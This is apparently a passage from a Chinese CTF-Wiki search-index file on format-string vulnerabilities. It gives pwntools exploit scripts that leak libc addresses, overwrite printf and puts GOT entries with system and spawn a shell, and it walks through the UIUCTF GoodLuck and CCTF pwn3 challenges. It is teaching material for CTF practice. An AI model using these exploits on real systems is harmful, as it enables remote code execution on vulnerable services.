\nprint\n \nleak addr: \n \n+\n \nhex\n(\naddr\n)\n\n            \nsh\n \n=\n \nremote\n(\nip\n,\n \nport\n)\n\n            \npayload\n \n=\n \n%00008$s\n \n+\n \nSTARTEND\n \n+\n \np64\n(\naddr\n)\n\n            \n# \u8bf4\u660e\u6709\\n\uff0c\u51fa\u73b0\u65b0\u7684\u4e00\u884c\n\n            \nif\n \n\\x0a\n \nin\n \npayload\n:\n\n                \nreturn\n \nNone\n\n            \nsh\n.\nsendline\n(\npayload\n)\n\n            \ndata\n \n=\n \nsh\n.\nrecvuntil\n(\nSTARTEND\n,\n \ndrop\n=\nTrue\n)\n\n            \nsh\n.\nclose\n()\n\n            \nreturn\n \ndata\n\n        \nexcept\n \nException\n:\n\n            \nnum\n \n+=\n \n1\n\n            \ncontinue\n\n    \nreturn\n \nNone\n\n\n\n\ndef\n \ngetbinary\n():\n\n    \naddr\n \n=\n \n0x400000\n\n    \nf\n \n=\n \nopen\n(\nbinary\n,\n \nw\n)\n\n    \nwhile\n \naddr\n \n \n0x401000\n:\n\n        \ndata\n \n=\n \nleak\n(\naddr\n)\n\n        \nif\n \ndata\n \nis\n \nNone\n:\n\n            \nf\n.\nwrite\n(\n\\xff\n)\n\n            \naddr\n \n+=\n \n1\n\n        \nelif\n \nlen\n(\ndata\n)\n \n==\n \n0\n:\n\n            \nf\n.\nwrite\n(\n\\x00\n)\n\n            \naddr\n \n+=\n \n1\n\n        \nelse\n:\n\n            \nf\n.\nwrite\n(\ndata\n)\n\n            \naddr\n \n+=\n \nlen\n(\ndata\n)\n\n    \nf\n.\nclose\n()\n\n\n\n\n##getbinary()\n\n\nread_got\n \n=\n \n0x601020\n\n\nprintf_got\n \n=\n \n0x601018\n\n\nsh\n \n=\n \nremote\n(\nip\n,\n \nport\n)\n\n\n## let the read get resolved\n\n\nsh\n.\nsendline\n(\na\n)\n\n\nsh\n.\nrecv\n()\n\n\n## get printf addr\n\n\npayload\n \n=\n \n%00008$s\n \n+\n \nSTARTEND\n \n+\n \np64\n(\nread_got\n)\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\ndata\n \n=\n \nsh\n.\nrecvuntil\n(\nSTARTEND\n,\n \ndrop\n=\nTrue\n)\n.\nljust\n(\n8\n,\n \n\\x00\n)\n\n\nsh\n.\nrecv\n()\n\n\nread_addr\n \n=\n \nu64\n(\ndata\n)\n\n\n\n## get system addr\n\n\nlibc\n \n=\n \nLibcSearcher\n(\nread\n,\n \nread_addr\n)\n\n\nlibc_base\n \n=\n \nread_addr\n \n-\n \nlibc\n.\ndump\n(\nread\n)\n\n\nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\ndump\n(\nsystem\n)\n\n\nlog\n.\nsuccess\n(\nsystem addr: \n \n+\n \nhex\n(\nsystem_addr\n))\n\n\nlog\n.\nsuccess\n(\nread   addr: \n \n+\n \nhex\n(\nread_addr\n))\n\n\n## modify printf_got\n\n\npayload\n \n=\n \nfmtstr_payload\n(\n6\n,\n \n{\nprintf_got\n:\n \nsystem_addr\n},\n \n0\n,\n \nwrite_size\n=\nshort\n)\n\n\n## get all the addr\n\n\naddr\n \n=\n \npayload\n[:\n32\n]\n\n\npayload\n \n=\n \n%32d\n \n+\n \npayload\n[\n32\n:]\n\n\noffset\n \n=\n \n(\nint\n)(\nmath\n.\nceil\n(\nlen\n(\npayload\n)\n \n/\n \n8.0\n)\n \n+\n \n1\n)\n\n\nfor\n \ni\n \nin\n \nrange\n(\n6\n,\n \n10\n):\n\n    \nold\n \n=\n \n%{}$\n.\nformat\n(\ni\n)\n\n    \nnew\n \n=\n \n%{}$\n.\nformat\n(\noffset\n \n+\n \ni\n)\n\n    \npayload\n \n=\n \npayload\n.\nreplace\n(\nold\n,\n \nnew\n)\n\n\nremainer\n \n=\n \nlen\n(\npayload\n)\n \n%\n \n8\n\n\npayload\n \n+=\n \n(\n8\n \n-\n \nremainer\n)\n \n*\n \na\n\n\npayload\n \n+=\n \naddr\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\nrecv\n()\n\n\n\n## get shell\n\n\nsh\n.\nsendline\n(\n/bin/sh;\n)\n\n\nsh\n.\ninteractive\n()\n\n\n\n\n\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e00\u6bb5\u4ee3\u7801\n\n\n## modify printf_got\n\n\npayload\n \n=\n \nfmtstr_payload\n(\n6\n,\n \n{\nprintf_got\n:\n \nsystem_addr\n},\n \n0\n,\n \nwrite_size\n=\nshort\n)\n\n\n## get all the addr\n\n\naddr\n \n=\n \npayload\n[:\n32\n]\n\n\npayload\n \n=\n \n%32d\n \n+\n \npayload\n[\n32\n:]\n\n\noffset\n \n=\n \n(\nint\n)(\nmath\n.\nceil\n(\nlen\n(\npayload\n)\n \n/\n \n8.0\n)\n \n+\n \n1\n)\n\n\nfor\n \ni\n \nin\n \nrange\n(\n6\n,\n \n10\n):\n\n    \nold\n \n=\n \n%{}$\n.\nformat\n(\ni\n)\n\n    \nnew\n \n=\n \n%{}$\n.\nformat\n(\noffset\n \n+\n \ni\n)\n\n    \npayload\n \n=\n \npayload\n.\nreplace\n(\nold\n,\n \nnew\n)\n\n\nremainer\n \n=\n \nlen\n(\npayload\n)\n \n%\n \n8\n\n\npayload\n \n+=\n \n(\n8\n \n-\n \nremainer\n)\n \n*\n \na\n\n\npayload\n \n+=\n \naddr\n\n\nsh\n.\nsendline\n(\npayload\n)\n\n\nsh\n.\nrecv\n()\n\n\n\n\n\nfmtstr_payload\u76f4\u63a5\u5f97\u5230\u7684payload\u4f1a\u5c06\u5730\u5740\u653e\u5728\u524d\u9762\uff0c\u800c\u8fd9\u4e2a\u4f1a\u5bfc\u81f4printf\u7684\u65f6\u5019'\\x00'\u622a\u65ad\uff08\n\u5173\u4e8e\u8fd9\u4e00\u95ee\u9898\uff0cpwntools\u76ee\u524d\u6b63\u5728\u5f00\u53d1fmt_payload\u7684\u52a0\u5f3a\u7248\uff0c\u4f30\u8ba1\u5feb\u5f00\u53d1\u51fa\u6765\u4e86\u3002\n\uff09\u3002\u6240\u4ee5\u6211\u4f7f\u7528\u4e86\u4e00\u4e9b\u6280\u5de7\u5c06\u5b83\u653e\u5728\u540e\u9762\u4e86\u3002\u4e3b\u8981\u7684\u601d\u60f3\u662f\uff0c\u5c06\u5730\u5740\u653e\u5728\u540e\u97628\u5b57\u8282\u5bf9\u9f50\u7684\u5730\u65b9\uff0c\u5e76\u5bf9payload\u4e2d\u7684\u504f\u79fb\u8fdb\u884c\u4fee\u6539\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\n\n\noffset\n \n=\n \n(\nint\n)(\nmath\n.\nceil\n(\nlen\n(\npayload\n)\n \n/\n \n8.0\n)\n \n+\n \n1\n)\n\n\n\n\n\n\u8fd9\u4e00\u884c\u7ed9\u51fa\u4e86\u4fee\u6539\u540e\u7684\u5730\u5740\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\uff0c\u4e4b\u6240\u4ee5\u662f\u8fd9\u6837\u5728\u4e8e\u65e0\u8bba\u5982\u4f55\u4fee\u6539\uff0c\u7531\u4e8e'%order$hn'\u4e2dorder\u591a\u51fa\u6765\u7684\u5b57\u7b26\u90fd\u4e0d\u4f1a\u5927\u4e8e8\u3002\u5177\u4f53\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_1", 
            "text": "\u4e0b\u9762\u4f1a\u4ecb\u7ecd\u4e00\u4e9bCTF\u4e2d\u7684\u683c\u5f0f\u5316\u6f0f\u6d1e\u7684\u9898\u76ee\u3002\u4e5f\u90fd\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5e38\u89c1\u7684\u5229\u7528\u3002", 
            "title": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#64", 
            "text": "", 
            "title": "64\u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_2", 
            "text": "\u5176\u5b9e64\u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c32\u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc764\u4f4d\u51fd\u6570\u7684\u524d6\u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f\u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_3", 
            "text": "\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee52017\u5e74\u7684UIUCTF\u4e2dpwn200 GoodLuck\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2aflag.txt\u6587\u4ef6\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_4", 
            "text": "\u279c   2017 -UIUCTF-pwn200-GoodLuck git: ( master )  \u2717 checksec goodluck\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u5f00\u542f\u4e86NX\u4fdd\u62a4\u4ee5\u53ca\u90e8\u5206RELRO\u4fdd\u62a4\u3002", 
            "title": "\u786e\u5b9a\u4fdd\u62a4"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_5", 
            "text": "\u53ef\u4ee5\u53d1\u73b0\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f88\u660e\u663e     for   (   j   =   0 ;   j   =   21 ;   ++ j   ) \n   { \n     v5   =   format [ j ]; \n     if   (   ! v5   ||   v11 [ j ]   !=   v5   ) \n     { \n       puts ( You answered: ); \n       printf ( format ); \n       puts ( \\n But that was totally wrong lol get rekt ); \n       fflush ( _bss_start ); \n       result   =   0 ; \n       goto   LABEL_11 ; \n     } \n   }", 
            "title": "\u5206\u6790\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_6", 
            "text": "\u6211\u4eec\u5728printf\u5904\u4e0b\u504f\u79fb\u5982\u4e0b,\u8fd9\u91cc\u53ea\u5173\u6ce8\u4ee3\u7801\u90e8\u5206\u4e0e\u6808\u90e8\u5206\u3002  gef\u27a4  b  printf \nBreakpoint  1  at 0x400640\ngef\u27a4  r\nStarting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck \nwhat s the flag  123456  You answered:  Breakpoint 1, __printf (format=0x602830  123456 ) at printf.c:28  28  printf.c: \u6ca1\u6709\u90a3\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55.  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500     0x7ffff7a627f7  fprintf+135     add    rsp, 0xd8     0x7ffff7a627fe  fprintf+142     ret         0x7ffff7a627ff                  nop       \u2192 0x7ffff7a62800  printf+0        sub    rsp, 0xd8     0x7ffff7a62807  printf+7        test   al, al     0x7ffff7a62809  printf+9        mov    QWORD PTR [rsp+0x28], rsi     0x7ffff7a6280e  printf+14       mov    QWORD PTR [rsp+0x30], rdx  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500  [ 0x7fffffffdb08 ,  l8 ]  8 \n0x00007fffffffdb08\u2502+0x00: 0x0000000000400890  \u2192   main+234  mov edi, 0x4009b8    \u2190  $rsp \n0x00007fffffffdb10\u2502+0x08: 0x0000000031000001\n0x00007fffffffdb18\u2502+0x10: 0x0000000000602830  \u2192  0x0000363534333231  ( 123456 ? ) \n0x00007fffffffdb20\u2502+0x18: 0x0000000000602010  \u2192   You answered:\\ng \n0x00007fffffffdb28\u2502+0x20: 0x00007fffffffdb30  \u2192   flag{11111111111111111 \n0x00007fffffffdb30\u2502+0x28:  flag{11111111111111111 \n0x00007fffffffdb38\u2502+0x30:  11111111111111 \n0x00007fffffffdb40\u2502+0x38: 0x0000313131313131  ( 111111 ? ) \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  trace  ] \u2500\u2500\u2500\u2500 [ #0] 0x7ffff7a62800 \u2192 Name: __printf(format=0x602830  123456 )  [ #1] 0x400890 \u2192 Name: main() \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  \u53ef\u4ee5\u770b\u5230flag\u5bf9\u5e94\u7684\u6808\u4e0a\u7684\u504f\u79fb\u4e3a5\uff0c\u9664\u53bb\u5bf9\u5e94\u7684\u7b2c\u4e00\u884c\u4e3a\u8fd4\u56de\u5730\u5740\u5916\uff0c\u5176\u504f\u79fb\u4e3a4\u3002\u6b64\u5916\uff0c\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a64\u4f4d\u7a0b\u5e8f\uff0c\u6240\u4ee5\u524d6\u4e2a\u53c2\u6570\u5b58\u5728\u5728\u5bf9\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\uff0cfmt\u5b57\u7b26\u4e32\u5b58\u50a8\u5728RDI\u5bc4\u5b58\u5668\u4e2d\uff0c\u6240\u4ee5fmt\u5b57\u7b26\u4e32\u5bf9\u5e94\u7684\u5730\u5740\u7684\u504f\u79fb\u4e3a10\u3002\u800cfmt\u5b57\u7b26\u4e32\u4e2d %order$s \u5bf9\u5e94\u7684order\u4e3afmt\u5b57\u7b26\u4e32\u540e\u9762\u7684\u53c2\u6570\u7684\u987a\u5e8f\uff0c\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u8f93\u5165 %9$s \u5373\u53ef\u5f97\u5230flag\u7684\u5185\u5bb9\u3002\u5f53\u7136\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u5229\u7528https://github.com/scwuaptx/Pwngdb\u4e2d\u7684fmtarg\u6765\u5224\u65ad\u67d0\u4e2a\u53c2\u6570\u7684\u504f\u79fb\u3002  gef\u27a4  fmtarg 0x00007fffffffdb28\nThe index of format argument :  10   \u9700\u8981\u6ce8\u610f\u7684\u662f\u6211\u4eec\u5fc5\u987bbreak\u5728printf\u5904\u3002", 
            "title": "\u786e\u5b9a\u504f\u79fb"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_7", 
            "text": "from   pwn   import   *  from   LibcSearcher   import   *  goodluck   =   ELF ( ./goodluck )  if   args [ REMOTE ]: \n     sh   =   remote ( pwn.sniperoj.cn ,   30017 )  else : \n     sh   =   process ( ./goodluck )  payload   =   %9$s  print   payload  ##gdb.attach(sh)  sh . sendline ( payload )  print   sh . recv ()  sh . interactive ()", 
            "title": "\u5229\u7528\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#hijack-got", 
            "text": "", 
            "title": "hijack GOT"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_8", 
            "text": "\u5728\u76ee\u524d\u7684C\u7a0b\u5e8f\u4e2d\uff0clibc\u4e2d\u7684\u51fd\u6570\u90fd\u662f\u901a\u8fc7GOT\u8868\u6765\u8df3\u8f6c\u7684\u3002\u6b64\u5916\uff0c\u5728 \u6ca1\u6709\u5f00\u542fRELRO\u4fdd\u62a4\u7684\u524d\u63d0\u4e0b\uff0c\u6bcf\u4e2alibc\u7684\u51fd\u6570\u5bf9\u5e94\u7684GOT\u8868\u9879\u662f\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u67d0\u4e2alibc\u51fd\u6570\u7684GOT\u8868\u5185\u5bb9\u4e3a\u53e6\u4e00\u4e2alibc\u51fd\u6570\u7684\u5730\u5740\u6765\u5b9e\u73b0\u5bf9\u7a0b\u5e8f\u7684\u63a7\u5236\u3002\u6bd4\u5982\u8bf4\u6211\u4eec\u53ef\u4ee5\u4fee\u6539printf\u7684got\u8868\u9879\u5185\u5bb9\u4e3asystem\u51fd\u6570\u7684\u5730\u5740\u3002\u4ece\u800c\uff0c\u7a0b\u5e8f\u5728\u6267\u884cprintf\u7684\u65f6\u5019\u5b9e\u9645\u6267\u884c\u7684\u662fsystem\u51fd\u6570\u3002  \u5047\u8bbe\u6211\u4eec\u5c06\u51fd\u6570A\u7684\u5730\u5740\u8986\u76d6\u4e3a\u51fd\u6570B\u7684\u5730\u5740\uff0c\u90a3\u4e48\u8fd9\u4e00\u653b\u51fb\u6280\u5de7\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u6b65\u9aa4    \u786e\u5b9a\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u3002   \u8fd9\u4e00\u6b65\u6211\u4eec\u5229\u7528\u7684\u51fd\u6570A\u4e00\u822c\u5728\u7a0b\u5e8f\u4e2d\u5df2\u6709\uff0c\u6240\u4ee5\u53ef\u4ee5\u91c7\u7528\u7b80\u5355\u7684\u5bfb\u627e\u5730\u5740\u7684\u65b9\u6cd5\u6765\u627e\u3002     \u786e\u5b9a\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740   \u8fd9\u4e00\u6b65\u901a\u5e38\u6765\u8bf4\uff0c\u9700\u8981\u6211\u4eec\u81ea\u5df1\u60f3\u529e\u6cd5\u6765\u6cc4\u9732\u5bf9\u5e94\u51fd\u6570B\u7684\u5730\u5740\u3002     \u5c06\u51fd\u6570B\u7684\u5185\u5b58\u5730\u5740\u5199\u5165\u5230\u51fd\u6570A\u7684GOT\u8868\u5730\u5740\u5904\u3002    \u8fd9\u4e00\u6b65\u4e00\u822c\u6765\u8bf4\u9700\u8981\u6211\u4eec\u5229\u7528\u51fd\u6570\u7684\u6f0f\u6d1e\u6765\u8fdb\u884c\u89e6\u53d1\u3002\u4e00\u822c\u5229\u7528\u65b9\u6cd5\u6709\u5982\u4e0b\u4e24\u79cd   \u5199\u5165\u51fd\u6570\uff1awrite\u51fd\u6570\u3002  ROP   pop eax; ret;           # printf@got -  eax\npop ebx; ret;           # (addr_offset = system_addr - printf_addr) -  ebx\nadd [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset   \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4efb\u610f\u5730\u5740\u5199", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_9", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee52016 CCTF\u4e2d\u7684pwn3\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_10", 
            "text": "\u5982\u4e0b  \u279c   2016 -CCTF-pwn3 git: ( master )  \u2717 checksec pwn3 \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002\u6211\u4eec\u4e00\u822c\u9ed8\u8ba4\u8fdc\u7a0b\u90fd\u662f\u5f00\u542fASLR\u4fdd\u62a4\u7684\u3002", 
            "title": "\u786e\u5b9a\u4fdd\u62a4"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_11", 
            "text": "\u9996\u5148\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u9700\u5bc6\u7801\u767b\u5f55\u7684ftp\uff0c\u5177\u6709get\uff0cput\uff0cdir\u4e09\u4e2a\u57fa\u672c\u529f\u80fd\u3002\u5927\u6982\u6d4f\u89c8\u4e00\u4e0b\u6bcf\u4e2a\u529f\u80fd\u7684\u4ee3\u7801\uff0c\u53d1\u73b0\u5728get\u529f\u80fd\u4e2d\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e  int   get_file ()  { \n   char   dest ;   // [sp+1Ch] [bp-FCh]@5 \n   char   s1 ;   // [sp+E4h] [bp-34h]@1 \n   char   * i ;   // [sp+10Ch] [bp-Ch]@3 \n\n   printf ( enter the file name you want to get: ); \n   __isoc99_scanf ( %40s ,   s1 ); \n   if   (   ! strncmp ( s1 ,   flag ,   4u )   ) \n     puts ( too young, too simple ); \n   for   (   i   =   ( char   * ) file_head ;   i ;   i   =   ( char   * ) * (( _DWORD   * ) i   +   60 )   ) \n   { \n     if   (   ! strcmp ( i ,   s1 )   ) \n     { \n       strcpy ( dest ,   i   +   0x28 ); \n       return   printf ( dest ); \n     } \n   } \n   return   printf ( dest );  }", 
            "title": "\u5206\u6790\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_12", 
            "text": "\u65e2\u7136\u6709\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u5982\u4e0b\u7684\u5229\u7528\u601d\u8def   \u7ed5\u8fc7\u5bc6\u7801  \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb  \u5229\u7528put@got\u83b7\u53d6put\u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684libc.so\u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94system\u51fd\u6570\u5730\u5740\u3002  \u4fee\u6539puts@got\u7684\u5185\u5bb9\u4e3asystem\u7684\u5730\u5740\u3002  \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884cputs\u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662fsystem\u51fd\u6570\u3002", 
            "title": "\u6f0f\u6d1e\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_13", 
            "text": "\u5982\u4e0b  from   pwn   import   *  from   LibcSearcher   import   LibcSearcher  ##context.log_level =  debug  pwn3   =   ELF ( ./pwn3 )  if   args [ REMOTE ]: \n     sh   =   remote ( 111 ,   111 )  else : \n     sh   =   process ( ./pwn3 )  def   get ( name ): \n     sh . sendline ( get ) \n     sh . recvuntil ( enter the file name you want to get: ) \n     sh . sendline ( name ) \n     data   =   sh . recv () \n     return   data  def   put ( name ,   content ): \n     sh . sendline ( put ) \n     sh . recvuntil ( please enter the name of the file you want to upload: ) \n     sh . sendline ( name ) \n     sh . recvuntil ( then, enter the content: ) \n     sh . sendline ( content )  def   show_dir (): \n     sh . sendline ( dir )  tmp   =   sysbdmin  name   =    for   i   in   tmp : \n     name   +=   chr ( ord ( i )   -   1 )  ## password  def   password (): \n     sh . recvuntil ( Name (ftp.hacker.server:Rainism): ) \n     sh . sendline ( name )  ##password  password ()  ## get the addr of puts  puts_got   =   pwn3 . got [ puts ]  log . success ( puts got :    +   hex ( puts_got ))  put ( 1111 ,   %8$s   +   p32 ( puts_got ))  puts_addr   =   u32 ( get ( 1111 )[: 4 ])  ## get addr of system  libc   =   LibcSearcher ( puts ,   puts_addr )  system_offset   =   libc . dump ( system )  puts_offset   =   libc . dump ( puts )  system_addr   =   puts_addr   -   puts_offset   +   system_offset  log . success ( system addr :    +   hex ( system_addr ))  ## modify puts@got, point to system_addr  payload   =   fmtstr_payload ( 7 ,   { puts_got :   system_addr })  put ( /bin/sh; ,   payload )  sh . recvuntil ( ftp )  sh . sendline ( get )  sh . recvuntil ( enter the file name you want to get: )  ##gdb.attach(sh)  sh . sendline ( /bin/sh; )  ## system( /bin/sh )  show_dir ()  sh . interactive ()   \u6ce8\u610f   \u6211\u5728\u83b7\u53d6puts\u51fd\u6570\u5730\u5740\u65f6\u4f7f\u7528\u7684\u504f\u79fb\u662f8\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u5e0c\u671b\u6211\u8f93\u51fa\u7684\u524d4\u4e2a\u5b57\u8282\u5c31\u662fputs\u51fd\u6570\u7684\u5730\u5740\u3002\u5176\u5b9e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u9996\u5730\u5740\u7684\u504f\u79fb\u662f7\u3002  \u8fd9\u91cc\u6211\u5229\u7528\u4e86pwntools\u4e2d\u7684fmtstr_payload\u51fd\u6570\uff0c\u6bd4\u8f83\u65b9\u4fbf\u83b7\u53d6\u6211\u4eec\u5e0c\u671b\u5f97\u5230\u7684\u7ed3\u679c\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u5c1d\u8bd5\u3002\u6bd4\u5982\u8fd9\u91ccfmtstr_payload(7, {puts_got: system_addr})\u7684\u610f\u601d\u5c31\u662f\uff0c\u6211\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u662f7\uff0c\u6211\u5e0c\u671b\u5728puts_got\u5730\u5740\u5904\u5199\u5165system_addr\u5730\u5740\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u6309\u7167\u5b57\u8282\u6765\u5199\u7684\u3002", 
            "title": "\u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#hijack-retaddr", 
            "text": "", 
            "title": "hijack retaddr"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_14", 
            "text": "\u5f88\u5bb9\u6613\u7406\u89e3\uff0c\u6211\u4eec\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u6765\u52ab\u6301\u7a0b\u5e8f\u7684\u8fd4\u56de\u5730\u5740\u5230\u6211\u4eec\u60f3\u8981\u6267\u884c\u7684\u5730\u5740\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_15", 
